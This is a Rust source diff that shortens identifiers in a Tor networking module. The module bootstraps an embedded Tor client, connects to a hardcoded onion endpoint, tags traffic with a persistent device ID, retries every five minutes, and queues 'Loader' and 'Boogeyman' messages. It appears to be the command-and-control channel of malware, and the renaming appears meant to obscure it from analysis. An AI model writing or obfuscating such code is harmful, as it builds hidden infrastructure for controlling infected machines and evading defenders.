@@ -18,10 +18,10 @@ pub type MutexPtr<T> = Arc<Mutex<T>>;
 pub type SendQueue = VecDeque<Vec<u8>>;
 
 #[derive(Clone)]
-pub struct TorHandler {
+pub struct TrHandler {
     pub logger: MutexPtr<Option<Logger>>,
-    pub constant_device_id: RwPtr<String>,
-    tor_client: MutexPtr<TorClient<tor_rtcompat::PreferredRuntime>>,
+    pub dv_id: RwPtr<String>,
+    tr_clnt: MutexPtr<TorClient<tor_rtcompat::PreferredRuntime>>,
     stream_prefs: RwPtr<StreamPrefs>,
     stream: Option<MutexPtr<DataStream>>,
     send_queue: MutexPtr<SendQueue>,
@@ -33,31 +33,31 @@ pub struct TorHandler {
 
 #[derive(Serialize, Deserialize, Debug, Clone)]
 pub struct ServerReceive {
-    pub server_receive_type: ServerReceiveType,
+    pub server_receive_type: SrvRcvTp,
     pub data: Vec<u8>,
 }
 #[derive(Serialize, Deserialize, Debug, Clone)]
-pub enum ServerReceiveType {
-    Loader,
-    Boogeyman,
+pub enum SrvRcvTp {
+    Ldr,
+    Bgm,
 }
-pub enum LoggerConfig {
+pub enum LoggerCnfg {
     Existing(Option<Logger>),
     New {
-        log_directory: PathBuf,
-        log_encryption_key: String,
+        log_dir: PathBuf,
+        log_enc_key: String,
     },
 }
-impl TorHandler {
-    pub async fn new(logger_config: LoggerConfig) -> Result<Self> {
+impl TrHandler {
+    pub async fn new(logger_config: LoggerCnfg) -> Result<Self> {
         let config = TorClientConfig::default();
         let tor_client = TorClient::create_bootstrapped(config).await.context(
             s!("Failed to create Tor client").to_string()
         )?;
         let mut stream_prefs: StreamPrefs = StreamPrefs::default();
         let logger = match logger_config {
-            LoggerConfig::Existing(logger) => logger,
-            LoggerConfig::New { log_directory, log_encryption_key } =>
+            LoggerCnfg::Existing(logger) => logger,
+            LoggerCnfg::New { log_dir: log_directory, log_enc_key: log_encryption_key } =>
                 Some(Logger::new(log_directory, log_encryption_key)?),
         };
         if let Some(lg) = &logger {
@@ -65,12 +65,12 @@ impl TorHandler {
         }
         stream_prefs.connect_to_onion_services(arti_client::config::BoolOrAuto::Explicit(true));
 
-        let tor_handler = TorHandler {
+        let tor_handler = TrHandler {
             stream: None,
-            constant_device_id: Arc::new(RwLock::new(fetch_constant_device_id())),
+            dv_id: Arc::new(RwLock::new(fetch_constant_device_id())),
             send_queue: Arc::new(Mutex::new(VecDeque::new())),
             logger: Arc::new(Mutex::new(logger)),
-            tor_client: Arc::new(Mutex::new(tor_client)),
+            tr_clnt: Arc::new(Mutex::new(tor_client)),
             stream_prefs: Arc::new(RwLock::new(stream_prefs)),
             tcp_receive_poll_delay_ms: Arc::new(RwLock::new(100)),
             retry_connect_interval_ms: Arc::new(RwLock::new(5 * 60 * 1000)), // 5 minutes
@@ -81,7 +81,7 @@ impl TorHandler {
         Ok(tor_handler)
     }
     pub async fn connect_to_endpoint(&mut self) -> Result<()> {
-        let tor_client = self.tor_client.lock().unwrap();
+        let tor_client = self.tr_clnt.lock().unwrap();
         let stream_prefs = self.stream_prefs.read().unwrap();
         let stream = tor_client
             .connect_with_prefs((onion_endpoint(), 80), &stream_prefs).await
@@ -202,11 +202,7 @@ impl TorHandler {
             }
         }
     }
-    pub fn add_to_send_queue(
-        &self,
-        server_receive_type: ServerReceiveType,
-        data: Vec<u8>
-    ) -> Result<()> {
+    pub fn add_to_send_queue(&self, server_receive_type: SrvRcvTp, data: Vec<u8>) -> Result<()> {
         let send = ServerReceive { server_receive_type, data };
         let binary_data = serde_json
             ::to_vec(&send)
